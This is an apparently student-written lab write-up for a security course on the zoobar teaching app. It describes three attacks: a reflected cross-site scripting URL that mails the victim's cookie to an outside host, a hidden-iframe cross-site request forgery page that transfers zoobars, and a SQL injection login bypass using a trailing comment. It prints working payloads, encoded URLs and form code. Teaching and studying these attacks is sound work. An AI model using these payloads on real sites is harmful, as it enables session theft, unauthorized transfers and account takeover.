Attack A

The goal of this exploit was to craft a url that would utilize the zoomail.org email script in order to
mail a user's cookie to ourselves.  This is exploitable because the code after the user variable in the 
url gets inserted into the HTML as the value for user.  First it is necessary to end the value variable
with an endquote ".  Then it is necessary to end the input element with a >.  After this, you can insert
any javascript you want starting with the <script> tag.  For example, the provided starting point url 
turns this:
<input type="text" name="user" value="" size=10>
Into this:
<input type="text" name="user" value=""><script>alert(document.cookie);</script>" size=10>

Knowing this allows us to insert javascript that then gets exectued by the page.
Instead of displaying the cookie information though, we wanted to convince the webpage to invoke the
zoomail.org script and e-mail the cookie to ourselves.  In order to this this, we had to create a 
javascript image element with the src element set to a url in the format specified by zoomail.org.  We
wanted the payload of the email to be the cookie associated with the zoobar webpage which can be accessed
as "document.cookie".

<script>
new Image().src='http://zoomail.org/sendmail.php?netid=pmcollins2&payload='+document.cookie+'&random='+Math.random();
</script>

This would successfully e-mail us the cookie but would cause "size=10>" to be displayed between the
entry box and view button.  It would also cause a red error message to appear.  In order to get around
this, after e-mailing the cookie we then wanted to switch back to the original webpage.  We did this using
the document.location property in javascript.  

document.location='/users.php';

The final piece was to encode the punctuation in the URL where necessary (: / < > etc).

http://zoobar.org/users.php?user=\"\>\<script\>new\ Image().src\=\'http\:\/\/zoomail.org\/sendmail.php\?netid\=pmcollins2\&payload\=\'\+document.cookie\+\'\&random\=\'\+Math.random()\;document.location\=\'\/users.php\'\;\<\/script\>

http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dpmcollins2\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Attack B

The goal of this attack was to create an HTML document that, when loaded in a 
browser, will transfer 10 zoobars from the user's account (if logged in) to the
attacker's account.  It then will redirect the browser to the course webpage so
that the user will not notice the transfer.

In order to accomplish this, we had to convince the browser to send a malicious
transfer request to zoobar.org/transfer.php.  This was done by creating a form
with the action attribute set to the transfer url.  In order for the user not to
see the form, we set the target attribute to be an invisible iframe called "frame".
	<iframe id="frame" name="frame" style="visibility: hidden"></iframe>
	<form id="attack" method="POST" target="frame" action="http://zoobar.org/transfer.php">

To set up the transfer of zoobars, we set the following values of the transfer form,
taken from the transfer.php code for zoobar:
	<input name="zoobars" type="hidden" value="10">
	<input name="recipient" type="hidden" value="attacker">

To submit the form without any user interaction, we used the window.onload property.
We created a function that will run when the window loads and when the form is
submitted.  The first time the function is called, we only want to click the send
button:
	document.getElementById('send').click();

The second time the function is called, we want to redirect the browser to the 
course webpage, which we do by changing the document.location property:
	document.location='http://pages.cs.wisc.edu/~rist/642-spring-2014/';

This successfully completes the attack.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Attack C

The goal of this attack was to create an HTML document that a user can load.
Then they can enter a username into a text field and log the user into zoobar.org 
under that username.  This was accomplished using SQL injection and will work with 
any username that is already registered on zoobar.

The HTML document first posts a form that allows the user to input a name and
password and then submit them.  When the user submits, the javascript attack()
function is run.  This takes the submitted username and appends '-- to it.

When the user submits the username, it will be submitted as a registration for
username'--.   This occurs in auth.php in the function _addRegistration.  It
will search the database for a user id associated with the given username. Since
the $quoteduser variable is escaped with an endquote, it will search the
database for username'--, which doesn't exist.  It will then add this user to
the database and then proceed to log them in with the _checkLogin function.

The _checkLogin function also escapes the $quoteduser input, so it will search
for our newly entered username'--.   It then hashes the password and searches
for an entry with the specified username and hashed password to see if there is
a match.  However, this $username variable is not escaped, so

$sql = "SELECT * FROM Person WHERE Username = '$username' AND Password = '$hashedpassword';

becomes

$sql = "SELECT * FROM Person WHERE Username = 'username'--' AND Password = '$hashedpassword';

The -- acts like a comment in SQL and the end of the query will be ignored, so
the password will not be checked.  Then _setCookie is called and sets the current
username, password, and id to those of the user we specified, and we are logged in
successfully.

One more issue with this attack is that it can only be executed once because it 
will only work if the username we specify is not already in the database.  To fix
this, we appended a random number to the end of the username after the '--

 "'--" + Math.round(Math.random()*Math.pow(2, 31))

Since it occurs after the comment, it will also be ignored when doing the password
check.  It will ensure that performing the attack multiple times will not fail
because we are using a new username every time.
